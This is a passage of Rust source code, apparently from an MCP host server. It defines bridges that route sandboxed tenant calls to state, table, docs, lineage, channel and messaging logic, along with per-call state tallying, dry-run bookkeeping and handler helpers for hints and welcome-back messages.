                tenant_state::state_delete_rows(&self.state, &self.tenant, &args, eu).await
            }
            other => Err(AppError::InvalidArgs(format!("unknown state op '{other}'"))),
        };
        if result.is_ok()
            && STATE_WRITE_OPS.contains(&op)
            && let Some(dry_run) = &self.dry_run
        {
            dry_run.record_write(json!({
                "store": "state",
                "op": op,
                "key": args.get("key").and_then(Value::as_str),
                "table": args.get("table").or_else(|| args.get("name")).and_then(Value::as_str),
            }));
        }
        result.map_err(app_error_to_kind_error)
    }
}

/// PRD-mcphost-tenant-tables requirement 3: [`TenantStateBridge`]'s
/// counterpart for `CallCtx.table` -- bridges `Kind::call`'s sandboxed
/// `mcphost.table` requests to `tables.rs`'s real-SQL business logic for
/// this call's own tenant. `op` is one of the bare verb names
/// `kinds::python`'s `mcphost.table` sandbox module sends (`"create"`,
/// `"append"`, `"query"`, `"list"`, `"drop"`, `"schema"`) -- distinct from
/// the dotted `host.table.*` tool names `dispatch_control_tool` matches
/// below, which is the *other* caller of these same `tables::table_*`
/// functions.
pub(crate) struct TenantTableBridge {
    pub(crate) state: Arc<AppState>,
    pub(crate) tenant: Tenant,
    /// PRD-mcphost-dry-run-side-effects requirement 3: see
    /// [`TenantStateBridge::dry_run`]'s own doc comment -- same convention.
    pub(crate) dry_run: Option<Arc<crate::dryrun::DryRunCtx>>,
    /// PRD-mcphost-row-policy requirement 10/AC12: this call's own end
    /// user (if any), threaded into `table_query` exactly like
    /// `TenantStateBridge::end_user` -- so a row policy scoped to an end
    /// user applies identically whether `host.table.query` is reached
    /// directly or via `mcphost.table.query` inside a python sandbox.
    pub(crate) end_user: Option<crate::enduser::EndUser>,
}

#[async_trait::async_trait]
impl TableBackend for TenantTableBridge {
    async fn call(&self, op: &str, args: Value) -> Result<Value, KindError> {
        let result = match op {
            "create" => tables::table_create(&self.state, &self.tenant, &args).await,
            "append" => tables::table_append(&self.state, &self.tenant, &args).await,
            "query" => {
                tables::table_query(&self.state, &self.tenant, &args, self.end_user.as_ref()).await
            }
            "list" => tables::table_list(&self.state, &self.tenant, &args).await,
            "drop" => tables::table_drop(&self.state, &self.tenant, &args).await,
            "schema" => tables::table_schema(&self.state, &self.tenant, &args).await,
            // PRD-mcphost-query-diagnosis P1 requirement 8/AC9: the
            // sandboxed caller receives the same object the tool itself
            // returns, over this same loopback channel.
            "query_diagnose" => tables::table_query_diagnose(&self.state, &self.tenant, &args).await,
            "query_stats" => tables::table_query_stats(&self.state, &self.tenant, &args).await,
            // PRD-mcphost-chart-in-a-minute AC11: `mcphost.table.chart`
            // inside the python sandbox receives the same `chart.v1` object
            // `host.table.chart` itself returns.
            "chart" => {
                crate::chart::table_chart(&self.state, &self.tenant, &args, self.end_user.as_ref())
                    .await
            }
            // PRD-mcphost-table-concept-graph P1 requirement 8: the same
            // three tools `host.table.graph`/`.join_paths`/
            // `.next_questions` expose, reachable from `mcphost.table` too
            // (AC9: "the same object the tool returns" -- these call the
            // exact same `tables_graph::*` functions `dispatch_control_tool`
            // does).
            "graph" => crate::tables_graph::table_graph(&self.state, &self.tenant, &args).await,
            "join_paths" => crate::tables_graph::join_paths(&self.state, &self.tenant, &args).await,
            "next_questions" => crate::tables_graph::next_questions(&self.state, &self.tenant, &args).await,
            "count" => tables::table_count(&self.state, &self.tenant, &args).await,
            "handles" => tables::table_handles(&self.state, &self.tenant, &args).await,
            "handle_drop" => tables::table_handle_drop(&self.state, &self.tenant, &args).await,
            other => Err(AppError::InvalidArgs(format!("unknown table op '{other}'"))),
        };
        // PRD-mcphost-dry-run-side-effects requirement 3: `table_append`'s
        // own `{table, appended, ids}` result already names everything a
        // write record needs -- read back from it rather than re-deriving
        // from `args` (which may omit `table` on a malformed call `append`
        // itself already rejected).
        if op == "append"
            && let (Ok(value), Some(dry_run)) = (&result, &self.dry_run)
        {
            dry_run.record_write(json!({
                "store": "table",
                "op": "append",
                "table": value.get("table").cloned().unwrap_or(Value::Null),
                "rows": value.get("appended").cloned().unwrap_or(Value::Null),
            }));
        }
        result.map_err(app_error_to_kind_error)
    }
}

/// PRD-mcphost-dry-run-side-effects requirement 1 (AC5): [`crate::kinds::HostDispatch`]
/// for `host.tool_test`'s own `CallCtx.host_dispatch` -- routes a `chain`
/// step's allowlisted `host.*` verb to the SAME `table`/`state` backends
/// this call's `mcphost.table`/`mcphost.state` sandbox calls go through, so
/// its write is recorded into `dry_run.writes` (and rolled back) by the
/// exact bridge logic [`TenantTableBridge`]/[`TenantStateBridge`] already
/// have, rather than a third copy of that bookkeeping. Distinct from
/// [`TenantHostStepBridge`] (PRD-mcphost-chain-host-steps' own, broader,
/// real-dispatch bridge for an ordinary, non-test call) -- that bridge
/// routes through `dispatch_tenant_tool`, a real (committed) write outside
/// any savepoint, which is exactly what `host.tool_test`'s dry run must
/// never do.
pub(crate) struct DryRunHostStepBridge {
    pub(crate) table: Arc<dyn TableBackend>,
    pub(crate) state: Arc<dyn StateBackend>,
}

#[async_trait::async_trait]
impl crate::kinds::HostDispatch for DryRunHostStepBridge {
    async fn call(&self, name: &str, args: Value) -> Result<Value, KindError> {
        match name {
            "host.table.append" => self.table.call("append", args).await,
            "host.table.query" => self.table.call("query", args).await,
            "host.table.create" => self.table.call("create", args).await,
            "host.state.get" => self.state.call("get", args).await,
            "host.state.set" => self.state.call("set", args).await,
            "host.state.delete" => self.state.call("delete", args).await,
            other => Err(KindError::Exec(format!(
                "host step dispatch does not support '{other}' in a dry run"
            ))),
        }
    }
}

/// PRD-mcphost-document-store P1 requirement 6: [`TenantStateBridge`]'s
/// counterpart for `CallCtx.docs` -- bridges `Kind::call`'s sandboxed
/// `mcphost.docs` requests to `docs.rs`'s real business logic for this
/// call's own tenant. `op` is one of the bare verb names `kinds::python`'s
/// `mcphost.docs` sandbox module sends -- `"get"`, plus `"search"`
/// (PRD-mcphost-docs-qa-recipe: `ask_docs.py`'s own zero-network,
/// zero-metered-call answer to `host.docs.search`, same loopback channel
/// `"get"` already uses).
pub(crate) struct TenantDocsBridge {
    pub(crate) state: Arc<AppState>,
    pub(crate) tenant: Tenant,
    /// PRD-mcphost-row-policy requirement 10: this call's own end user (if
    /// any), threaded into `doc_search` exactly like
    /// `TenantTableBridge::end_user` -- so a doc-prefix policy scoped to an
    /// end user applies identically whether `host.docs.search` is reached
    /// directly or via `mcphost.docs.search` inside a python sandbox.
    pub(crate) end_user: Option<crate::enduser::EndUser>,
}

#[async_trait::async_trait]
impl DocsBackend for TenantDocsBridge {
    async fn call(&self, op: &str, args: Value) -> Result<Value, KindError> {
        let result = match op {
            "get" => docs::doc_get(&self.state, &self.tenant, &args).await,
            "search" => {
                docs::doc_search(&self.state, &self.tenant, &args, self.end_user.as_ref()).await
            }
            // PRD-mcphost-index-create-from-sources-b R6: `mcphost.index`
            // rides this channel, calling the same functions the host verbs do.
            "index_create" => crate::index::index_create(&self.state, &self.tenant, &args).await,
            "index_status" => crate::index::index_status(&self.state, &self.tenant, &args).await,
            "index_list" => crate::index::index_list(&self.state, &self.tenant, &args).await,
            "quota" => control::data_quota_for(&self.state, &self.tenant)
                .await
                .map(|q| q.unwrap_or(Value::Null)),
            // PRD-mcphost-blob-put-get-signed-url R6: `mcphost.blob` rides
            // this same channel (no second socket for a `network: none`
            // sandbox), so its two ops are routed here.
            "blob_get" | "blob_put" => crate::blobs::bridge(&self.state, &self.tenant, op, &args).await,
            other => Err(AppError::InvalidArgs(format!("unknown docs op '{other}'"))),
        };
        result.map_err(app_error_to_kind_error)
    }
}

/// PRD-mcphost-lineage-blast-radius P1 requirement 10 (AC12):
/// [`TenantDocsBridge`]'s counterpart for `CallCtx.lineage` -- bridges
/// `Kind::call`'s sandboxed `mcphost.lineage` requests to `lineage.rs`'s
/// real business logic for this call's own tenant, the exact same
/// `trace`/`blast_radius` functions `host.lineage.trace`/`blast_radius`
/// call, so a tool gets back the same object those tools return (AC12).
pub(crate) struct TenantLineageBridge {
    pub(crate) state: Arc<AppState>,
    pub(crate) tenant: Tenant,
}

#[async_trait::async_trait]
impl LineageBackend for TenantLineageBridge {
    async fn call(&self, op: &str, args: Value) -> Result<Value, KindError> {
        let result = match op {
            "trace" => crate::lineage::trace(&self.state, &self.tenant, &args).await,
            "blast_radius" => crate::lineage::blast_radius(&self.state, &self.tenant, &args).await,
            other => Err(AppError::InvalidArgs(format!("unknown lineage op '{other}'"))),
        };
        result.map_err(app_error_to_kind_error)
    }
}

/// PRD-mcphost-drift-review P1 requirement 10 (AC12): [`TenantLineageBridge`]'s
/// counterpart for `CallCtx.drift` -- bridges `Kind::call`'s sandboxed
/// `mcphost.drift` requests to `drift::reviews`, the exact same function
/// `host.drift.reviews` calls, so a tool gets back the same object that
/// tool returns (AC12).
pub(crate) struct TenantDriftBridge {
    pub(crate) state: Arc<AppState>,
    pub(crate) tenant: Tenant,
}

#[async_trait::async_trait]
impl DriftBackend for TenantDriftBridge {
    async fn call(&self, op: &str, args: Value) -> Result<Value, KindError> {
        let result = match op {
            "reviews" => crate::drift::reviews(&self.state, &self.tenant, &args).await,
            other => Err(AppError::InvalidArgs(format!("unknown drift op '{other}'"))),
        };
        result.map_err(app_error_to_kind_error)
    }
}

/// PRD-mcphost-sandbox-channel-msg-bridge requirement 2: [`TenantLineageBridge`]'s
/// counterpart for `CallCtx.channel` -- bridges `Kind::call`'s sandboxed
/// `mcphost.channel` requests to `channels.rs`'s real business logic for
/// this call's own tenant, the exact same `post`/`read` functions
/// `host.channel.post`/`read` call (not the MCP handler, so this never
/// re-authenticates), so a tool's post is attributed to the tenant exactly
/// as a direct `host.channel.post` call would be (AC1).
pub(crate) struct TenantChannelBridge {
    pub(crate) state: Arc<AppState>,
    pub(crate) tenant: Tenant,
}

#[async_trait::async_trait]
impl ChannelBackend for TenantChannelBridge {
    async fn call(&self, op: &str, args: Value) -> Result<Value, KindError> {
        let result = match op {
            "post" => channels::post(&self.state, &self.tenant, &args).await,
            "read" => channels::read(&self.state, &self.tenant, &args).await,
            other => Err(AppError::InvalidArgs(format!("unknown channel op '{other}'"))),
        };
        result.map_err(app_error_to_kind_error)
    }
}

/// PRD-mcphost-sandbox-channel-msg-bridge requirement 2: [`TenantChannelBridge`]'s
/// counterpart for `CallCtx.msg` -- bridges `Kind::call`'s sandboxed
/// `mcphost.msg` requests to `messaging.rs`'s real business logic for this
/// call's own tenant, the exact same `send`/`inbox` functions
/// `host.msg.send`/`inbox` call.
pub(crate) struct TenantMsgBridge {
    pub(crate) state: Arc<AppState>,
    pub(crate) tenant: Tenant,
}

#[async_trait::async_trait]
impl MsgBackend for TenantMsgBridge {
    async fn call(&self, op: &str, args: Value) -> Result<Value, KindError> {
        let result = match op {
            "send" => messaging::send(&self.state, &self.tenant, &args).await,
            "inbox" => messaging::inbox(&self.state, &self.tenant, &args).await,
            // PRD-mcphost-send-email-from-tool R7: `mcphost.email.send` rides this backend (see
            // `kinds::python::EmailSidecarBridge`), which adds the calling tool's name.
            "email_send" => crate::email_send::send_from_bridge(&self.state, &self.tenant, &args).await,
            other => Err(AppError::InvalidArgs(format!("unknown msg op '{other}'"))),
        };
        result.map_err(app_error_to_kind_error)
    }
}

/// PRD-mcphost-chain-host-steps requirement 1/3: [`TenantLineageBridge`]'s
/// counterpart for `CallCtx.host_dispatch` -- bridges a chain step naming an
/// allowlisted `host.*` verb (`kinds::HOST_STEPS_ALLOWED`) to this host's
/// own `dispatch_tenant_tool`, the exact same ~150-arm match a direct
/// `host.*` call goes through, so a step's result/error is identical to
/// what calling that verb directly would return (requirement 3). `subject`
/// is always `None` and `auth_method` always `"key"`: of every allowlisted
/// verb, only `host.whoami` (not on the allowlist) ever reads either
/// parameter, so there is nothing for a chain step to lose by not
/// re-deriving the chain run's own caller identity here -- `end_user` and
/// `calls_auth_method` (the two parameters an allowlisted verb's own nested
/// dispatch, `host.tool_call`, actually meters by) are threaded through
/// from the chain's own real call.
pub(crate) struct TenantHostStepBridge {
    pub(crate) handler: McpHostHandler,
    pub(crate) tenant: Tenant,
    pub(crate) end_user: Option<crate::enduser::EndUser>,
    pub(crate) calls_auth_method: String,
    /// PRD-mcphost-chain-host-steps P1 requirement 6 (AC6): the name of the
    /// most recent `host.*` verb this bridge dispatched, read back by
    /// `call_published_tool` after `kind.call` returns and written into
    /// that one call's own `calls.step_tool` -- same single-slot-cell shape
    /// as [`CellResourceSink`] above. A chain with more than one host step
    /// overwrites this each dispatch, so only the last one survives; no
    /// landed chain spec has more than one yet (requirement 6 only
    /// promises attribution for "a chain with one host step").
    pub(crate) step_tool: Arc<std::sync::Mutex<Option<String>>>,
}

#[async_trait::async_trait]
impl crate::kinds::HostDispatch for TenantHostStepBridge {
    async fn call(&self, name: &str, args: Value) -> Result<Value, KindError> {
        if let Ok(mut slot) = self.step_tool.lock() {
            *slot = Some(name.to_string());
        }
        self.handler
            .dispatch_tenant_tool(
                &self.tenant,
                None,
                "key",
                &self.calls_auth_method,
                self.end_user.as_ref(),
                None,
                name,
                args,
            )
            .await
            // A nested python tool call's in-flight `resources_used` marker is
            // wire-only (`_meta`): a bridge call's returned JSON stays exactly
            // what the callee produced.
            .map(crate::envelope::strip_bridge_resources_used)
            .map_err(app_error_to_kind_error)
    }
}

/// requirement 5 / AC7: the per-call tally `CountingStateBackend` builds up
/// as `mcphost.state`/`host.state.*` ops flow through this call's
/// `CallCtx.state`, read back after `Kind::call`/`Kind::tool_run` returns
/// to fill `host.tool_test`/`host.tool_run`'s `state: {reads, writes, keys,
/// tables}`. `get`/`list`/`query` count as reads; every op that can mutate
/// the store counts as a write, whether or not it ends up changing
/// anything (a `delete` of a key that was never set still counts -- the
/// caller asked to write, same as `record_call`'s `ok = 1` for a tool call
/// that ran but changed nothing).
#[derive(Default, Clone)]
struct StateTally {
    reads: i64,
    writes: i64,
    keys: Vec<String>,
    tables: Vec<String>,
}

impl StateTally {
    fn to_json(&self) -> Value {
        json!({
            "reads": self.reads,
            "writes": self.writes,
            "keys": self.keys,
            "tables": self.tables,
        })
    }
}

/// Wraps a real `StateBackend` (always a `TenantStateBridge` in practice)
/// to (a) tally reads/writes/keys/tables for `host.tool_test`/
/// `host.tool_run`'s `state` field and (b) optionally push one `CallLog`
/// line per write -- `host.tool_logs`' "state writes carry key or table and
/// byte delta" (requirement 5). `log` is `None` for `host.tool_test`
/// (which persists no logs at all, same as every other call it makes)
/// and `Some` for a real published call.
pub(crate) struct CountingStateBackend {
    inner: Arc<dyn StateBackend>,
    tally: std::sync::Mutex<StateTally>,
    log: Option<Arc<dyn CallLog>>,
}

impl CountingStateBackend {
    pub(crate) fn new(inner: Arc<dyn StateBackend>, log: Option<Arc<dyn CallLog>>) -> Self {
        Self {
            inner,
            tally: std::sync::Mutex::new(StateTally::default()),
            log,
        }
    }

    fn snapshot(&self) -> StateTally {
        self.tally.lock().map(|g| g.clone()).unwrap_or_default()
    }
}

/// `op` names one of `tenant_state.rs`'s own verbs, exactly as
/// `TenantStateBridge::call` (above) matches them.
const STATE_WRITE_OPS: &[&str] = &[
    "set",
    "delete",
    "table_create",
    "table_drop",
    "insert",
    "delete_rows",
];

#[async_trait::async_trait]
impl StateBackend for CountingStateBackend {
    async fn call(&self, op: &str, args: Value) -> Result<Value, KindError> {
        let key = args.get("key").and_then(Value::as_str).map(str::to_string);
        // `table_create`/`table_drop` name the table `name`; `insert`/
        // `query`/`delete_rows` name it `table` -- same split
        // `kinds::python`'s `mcphost.state` module and `host.state.*`'s own
        // schema use.
        let table = match op {
            "table_create" | "table_drop" => {
                args.get("name").and_then(Value::as_str).map(str::to_string)
            }
            _ => args.get("table").and_then(Value::as_str).map(str::to_string),
        };
        let is_write = STATE_WRITE_OPS.contains(&op);

        let result = self.inner.call(op, args).await?;

        if let Ok(mut guard) = self.tally.lock() {
            if is_write {
                guard.writes += 1;
            } else {
                guard.reads += 1;
            }
            if let Some(k) = &key
                && !guard.keys.contains(k)
            {
                guard.keys.push(k.clone());
            }
            if let Some(t) = &table
                && !guard.tables.contains(t)
            {
                guard.tables.push(t.clone());
            }
        }

        if is_write
            && let Some(log) = &self.log
        {
            let bytes_delta = result.get("bytes_delta").and_then(Value::as_i64).unwrap_or(0);
            let line = match (&key, &table) {
                (Some(k), _) => format!("state_write key={k} bytes_delta={bytes_delta}"),
                (None, Some(t)) => format!("state_write table={t} bytes_delta={bytes_delta}"),
                (None, None) => format!("state_write op={op} bytes_delta={bytes_delta}"),
            };
            log.log(&line);
        }

        Ok(result)
    }
}

// ---- the handler -----------------------------------------------------

/// The stack, in bytes, every forwarded dotted host verb must complete its real
/// `host.tool_call` / `host.tool_test` call in on a debug build (profile and
/// test thread as CI's `cargo test`). GENERATED MEASUREMENT: the measured
/// maximum over all 230 forwardable ids is 1,028,096 B (every id measures it:
/// `test:host.trigger.set`, `call:host.whoami`,
/// `call:host.webhook_inbox.create`, `call:host.vault.status`, ...,
/// `scripts/fwd-stack-measure.sh all`, 2026-10-18 (re-measured 2026-10-20 with the sub-key `acting_for` lineage on the call path, and 2026-10-21 with the implicit-signup rollback guard on the first-call path: 983,040 -> 991,232 B; and 2026-10-23 with the schema-shape validators on the argument path: 991,232 -> 1,007,616 B; and 2026-10-24 CI's debug build measured `call:host.whoami` at 1,011,712 B (PR #515 run 40094459445; a CI figure, not `scripts/fwd-stack-measure.sh all`, so a script re-run must not lower it); and 2026-10-24 merged with the progress-token sink on the call path: CI figure, run 40114224490 (debug build), `call:host.whoami` minimum stack 1019904 bytes, so a script re-run must not lower it; and 2026-10-27 merged with the subscriptions-listen stream: `scripts/fwd-stack-measure.sh call:host.whoami` (debug build) 1,024,000 B, +4,096 B over main; the branch alone measured 995,328 B; and 2026-10-30 with the per-session implicit-signup peer-recent gate on the first-call path: `scripts/fwd-stack-measure.sh` (debug build) 1,024,000 -> 1,028,096 B on `test:host.trigger.set`, `call:host.whoami`, `call:host.webhook_inbox.create` and `call:host.vault.status`), after the dispatch table
/// (`src/dispatch_table.rs`) and the boxed `call_tool_inner` helpers; the shared
/// level rose from 823,296 B on 10-17 with main's own frames, chiefly rmcp's
/// `handle_request` poll frame, 48 -> 137 KiB, while `host.doctor` stopped
/// compiling its error-envelope report on the caller's stack) and the
/// budget is that + 25 % = 1,285,120 B, so CI's 2 MiB test thread keeps
/// 40 % of it free and the next fat frame fails
/// `tests/verbfwd_ac08_forward_stack_budget.rs`, naming the verb, instead of SIGABRTing a shard (run 326 `verbfwd_ac01`, run
/// 953; both 10-17, both `has overflowed its stack`). The boundary is
/// `dispatch_tenant_tool` / `forward_host_verb`, where a dotted verb re-enters
/// the dispatcher. Re-measure and tighten as the dispatch frames shrink.
pub const FORWARD_STACK_BUDGET: usize = 1_285_120;

/// The validator's registration for what `host.spec.test` owns (R3): more
/// than `MAX_TEST_INVOCATIONS` invocations is refused `too_many_invocations`
/// (`data.limit`) by the handler, ahead of any run.
pub const ARG_OWNERS: &[crate::host_args::ArgOwner] = &[crate::host_args::ArgOwner {
    applies: |tool| tool.replace('_', ".") == "host.spec.test",
    path: "/invocations",
    keywords: &["maxItems"],
    codes: &["too_many_invocations"],
}];

/// Verbs whose handler forwards a call back into `dispatch_tenant_tool`; see the
/// comment there. Canonical dotted names (an alias is resolved before dispatch).
const FORWARDING_WRAPPERS: &[&str] = &["host.tool.call", "host.tool.test", "host.estimate"];

/// Who a resource method is acting for (see `resolve_resource_caller`).
struct ResourceCaller {
    tenant: Option<Tenant>,
    /// The OAuth `scope` claim; `None` for a key (unrestricted).
    token_scope: Option<String>,
}

#[derive(Clone)]
pub struct McpHostHandler {
    pub state: Arc<AppState>,
}

/// The boxed future `McpHostHandler::record_acting_for` returns: `Some` carries the
/// lookup error to surface, `None` means the lineage (if any) was recorded.
type ActingForLookup<'a> =
    std::pin::Pin<Box<dyn std::future::Future<Output = Option<Box<McpError>>> + Send + 'a>>;

impl McpHostHandler {
    /// PRD-mcphost-acting-for-in-ledger-and-audit: a sub-key's call says who it
    /// acted for on its response `_meta` and its error `data`. Out of line and
    /// boxed so `call_tool`'s forwarded-call frame does not grow
    /// (`tests/fwdtab_ac05_budget_lowered_on_the_measurement.rs`).
    fn call_tool_acting_for(
        &self,
        request: CallToolRequestParams,
        ctx: RequestContext<RoleServer>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = Result<CallToolResponse, McpError>> + Send + '_>> {
        Box::pin(crate::subkeys::CALL_ACTING_FOR.scope(std::cell::RefCell::new(None), async move {
            let result = Box::pin(self.call_tool_inner(request, ctx)).await;
            match crate::subkeys::current_acting_for() {
                Some(af) => attach_acting_for(result, &af),
                None => result,
            }
        }))
    }

    /// Renders the sub-key's lineage into `CALL_ACTING_FOR`. Boxed and out of
    /// line so `call_tool_inner`'s forwarded-call stack frame does not grow
    /// (`tests/fwdtab_ac05_budget_lowered_on_the_measurement.rs`).
    fn record_acting_for(&self, key_id: i64) -> ActingForLookup<'_> {
        Box::pin(async move {
            match self.state.db.acting_for_for_key(key_id).await {
                Ok(Some(af)) => {
                    let _ = crate::subkeys::CALL_ACTING_FOR.try_with(|c| *c.borrow_mut() = Some(af));
                    None
                }
                Ok(None) => None,
                Err(e) => Some(Box::new(e.into_error_data_at(Some(&self.state.public_url)))),
            }
        })
    }

    pub fn new(state: Arc<AppState>) -> Self {
        Self { state }
    }

    /// PRD-mcphost-resources-for-tenant-data requirement 3: the `list_tools`
    /// auth chain (path secret -> Authorization header -> the session's
    /// signup binding) for a resource method, which carries no `tenant_key`
    /// argument. Anonymous, invalid, admin and sub-key callers resolve to no
    /// tenant: a resource is tenant data, and a sub-key's tool allowlist has
    /// no resource analogue.
    async fn resolve_resource_caller(&self, ctx: &RequestContext<RoleServer>) -> Result<ResourceCaller, McpError> {
        let parts = get_parts(ctx)?;
        let at = |e: AppError| e.into_error_data_at(Some(&self.state.public_url));
        let mut sub_key: Option<crate::subkeys::SubKey> = None;
        let mut auth = match resolve_path_secret_auth(&self.state, parts, "").await.map_err(at)? {
            Some(a) => a,
            None => resolve_auth(&self.state, parts, &mut sub_key, "").await.map_err(at)?,
        };
        if matches!(auth, Auth::Anonymous)
            && let Some(session_id) = session_id(parts)
            && let Some(bound) = resolve_session_binding(&self.state, &session_id, "").await.map_err(at)?
        {
            auth = bound;
        }
        let mut caller = ResourceCaller { tenant: None, token_scope: None };
        if let Auth::Tenant(tenant, oauth_caller) = auth {
            if let Some(ns) = tenant_path_namespace(parts)
                && tenant.namespace != ns
            {
                return Err(at(AppError::WrongTenant));
            }
            if sub_key.is_none() {
                caller.token_scope = oauth_caller.and_then(|o| o.scope);
                caller.tenant = Some(*tenant);
            }
        }
        Ok(caller)
    }

    /// PRD-mcphost-kind-ask-routing requirement 5 (AC6): best-effort ledger
    /// write for a `did_you_mean` hit; a failed write only logs.
    async fn record_did_you_mean(&self, tenant: &Tenant, called: &str, outcome: &str) {
        if let Err(e) = self
            .state
            .db
            .record_did_you_mean(tenant.id, called.to_string(), outcome.to_string(), now_unix())
            .await
        {
            tracing::warn!(tenant = %tenant.namespace, error = %e, "record_did_you_mean failed");
        }
    }

    /// PRD-mcphost-one-next-tool requirement 4 (AC4, AC5), requirement 5
    /// (AC6, AC7): attaches `next: {tool, why}` to a successful `host.*`
    /// tenant result when every condition holds:
    /// - `header_authenticated` is false (AC7: a bearer-header-resolved
    ///   call, key or OAuth alike, never gets one);
    /// - the tenant hasn't turned hints off (`host.agent.profile_set(hints:
    ///   false)`, AC6);
    /// - the tenant had used fewer than five distinct `host.*` tools
    ///   *before* this call (AC5) -- checked before, not after,
    ///   [`Self::record_host_tool_use`] below records this very call;
    /// - `value` doesn't already carry its own `next` -- `signup`/
    ///   `host.redeem`/`host.quickstart`'s pre-existing literal-string
    ///   field is never overwritten (the PRD's own non-goal: "not changing
    ///   host.quickstart's try_before_call table");
    /// - the chosen tool (`control::next_hint_for`) isn't the one just
    ///   called and isn't already used (requirement 4's own clause).
    ///
    /// Called only for a `host.*` name on a resolved `Auth::Tenant` --
    /// `billing.*` and a tenant's own namespaced/shared tool calls return
    /// immediately (requirement 8), as does `admin.*` (never reaches this
    /// method at all).
    async fn maybe_attach_next_hint(
        &self,
        tenant: &Tenant,
        header_authenticated: bool,
        called: &str,
        value: &mut Value,
    ) {
        if !called.starts_with("host.") {
            return;
        }
        // Resolves ANY hint this tenant was shown on a previous call,
        // before considering whether THIS call shows a new one -- so a
        // call can never resolve the hint it is itself about to issue.
        if let Err(e) = self.state.db.resolve_pending_hint(tenant.id, called.to_string()).await {
            tracing::warn!(tenant = %tenant.namespace, error = %e, "resolve_pending_hint failed");
        }
        // PRD-mcphost-resume-tool R6: host.resume carries its own `next_call`.
        if !header_authenticated && called != crate::resume::TOOL_NAME && value.get("next").is_none() {
            match self.state.db.agent_profile(tenant.id).await {
                Ok(profile) if profile.hints => {
                    match self.state.db.count_distinct_host_tools_used(tenant.id).await {
                        Ok(used_before) if used_before < 5 => {
                            let (hint_tool, why) = control::next_hint_for(called);
                            let already_used = hint_tool == called
                                || self
                                    .state
                                    .db
                                    .host_tool_already_used(tenant.id, hint_tool.to_string())
                                    .await
                                    .unwrap_or(true);
                            if !already_used
                                && let Some(obj) = value.as_object_mut()
                            {
                                obj.insert("next".to_string(), json!({"tool": hint_tool, "why": why}));
                                if let Err(e) = self
                                    .state
                                    .db
                                    .record_hint_shown(tenant.id, hint_tool.to_string(), now_unix())
                                    .await
                                {
                                    tracing::warn!(tenant = %tenant.namespace, error = %e, "record_hint_shown failed");
                                }
                            }
                        }
                        _ => {}
                    }
                }
                _ => {}
            }
        }
        // PRD-mcphost-tool-call-host-verb-forward requirement 2 (AC7):
        // `"direct"` -- this is the generic per-successful-call site for
        // every `host.*` dispatch, wrapper call included; a forwarded verb
        // gets its own, separate `"tool_call"`-tagged record from
        // `forward_host_verb`.
        if let Err(e) = self
            .state
            .db
            .record_host_tool_use(tenant.id, called.to_string(), "direct".to_string(), now_unix())
            .await
        {
            tracing::warn!(tenant = %tenant.namespace, error = %e, "record_host_tool_use failed");
        }
    }

    /// PRD-mcphost-first-call-gift requirement 4/5 (AC3-5): `welcome_back`
    /// on the first successful `host.*` call of a session, for a tenant
    /// with at least one earlier session -- never twice in the same
    /// session (requirement 4 / AC4), and never at all for a
    /// header/`tenant_key`-argument-authenticated session or a tenant that
    /// opted out (requirement 5 / AC5): `via_session_binding`/
    /// `via_url_secret` are the only two auth paths this ever fires on.
    ///
    /// `tenant.last_seen_unix` was loaded by this call's own auth resolver
    /// (`resolve_session_binding`/`resolve_path_secret_auth`) BEFORE it
    /// bumped the column, so a `Some` here already proves an earlier
    /// session's own last call, never this one's -- a brand-new tenant (no
    /// earlier authenticated call at all) is `None`, which is exactly how
    /// this stays mutually exclusive with `onboarding` (requirement:
    /// "a brand-new tenant has no earlier session").
    ///
    /// `session_id`'s "already shown this session" check reuses
    /// [`crate::invites::InviteHintTracker`] (`self.state.invite_hints`)
    /// under a distinct `welcome_back:`-prefixed key, rather than a new
    /// `AppState` field -- it is already exactly the generic "has this
    /// session_id been marked before" set this needs, for a different `X`.
    #[allow(clippy::too_many_arguments)]
    async fn maybe_attach_welcome_back(
        &self,
        tenant: &Tenant,
        via_session_binding: bool,
        via_url_secret: bool,
        session_id: Option<&str>,
        called: &str,
        value: &mut Value,
    ) {
        if !called.starts_with("host.") || !(via_session_binding || via_url_secret) {
            return;
        }
        let Some(last_seen_unix) = tenant.last_seen_unix else {
            return;
        };
        let Some(sid) = session_id else {
            return;
        };
        if !self.state.invite_hints.mark_first(&format!("welcome_back:{sid}")) {
            return;
        }
        // PRD-mcphost-resume-tool R6: the resume IS the welcome back; marking
        // the session above keeps a later host.* call from repeating it.
        if called == crate::resume::TOOL_NAME {
            return;
        }
        let profile = match self.state.db.agent_profile(tenant.id).await {
            Ok(p) => p,
            Err(e) => {
                tracing::warn!(tenant = %tenant.namespace, error = %e, "agent_profile lookup failed");
                return;
            }
        };
        if !profile.welcome_back {
            return;
        }
        let (notes, last_note) = match tenant_state::first_contact_summary(&self.state, tenant.id).await {
            Ok(v) => v,
            Err(e) => {
                tracing::warn!(tenant = %tenant.namespace, error = %e, "first_contact_summary failed");
                return;
            }
        };
        // PRD-mcphost-second-session-nudge requirement 4 (AC6):
        // `since_you_left` -- calls/runs since the earlier session's own
        // last call, inbox messages waiting right now, and how many whole
        // days have passed. Best-effort: a lookup failure here still
        // leaves `notes`/`last_note`/`last_seen` on the envelope rather
        // than dropping `welcome_back` entirely.
        let since_you_left = match self.since_you_left(tenant.id, last_seen_unix).await {
            Ok(v) => Some(v),
            Err(e) => {
                tracing::warn!(tenant = %tenant.namespace, error = %e, "since_you_left failed");
                None
            }
        };
        if let Some(obj) = value.as_object_mut() {
            let mut envelope = json!({
                "notes": notes,
                "last_note": last_note,
                "last_seen": crate::state::rfc3339_from_unix(last_seen_unix),
                // PRD-mcphost-resume-tool R6: the one call that answers "what was I doing?".
                "next": crate::resume::TOOL_NAME,
            });
            if let Some(since_you_left) = since_you_left
                && let Some(envelope_obj) = envelope.as_object_mut()
            {
                envelope_obj.insert("since_you_left".to_string(), since_you_left);
            }
            obj.insert("welcome_back".to_string(), envelope);
        }
    }

    /// PRD-mcphost-second-session-nudge requirement 4 (AC6):
    /// `{calls, runs, inbox, days}` since `last_seen_unix` -- `calls`/`runs`
    /// reuse the same `tenant_id, started_unix`-indexed queries
    /// `host.usage` already runs (`Db::count_calls_since`/
    /// `Db::count_runs_done_since`); `inbox` is unread messages waiting
    /// right now, not windowed by `last_seen_unix` (a message delivered
    /// and read during the gap shouldn't count as still "waiting").
    async fn since_you_left(&self, tenant_id: i64, last_seen_unix: i64) -> Result<Value, AppError> {
        let calls = self.state.db.count_calls_since(tenant_id, last_seen_unix, false).await?;
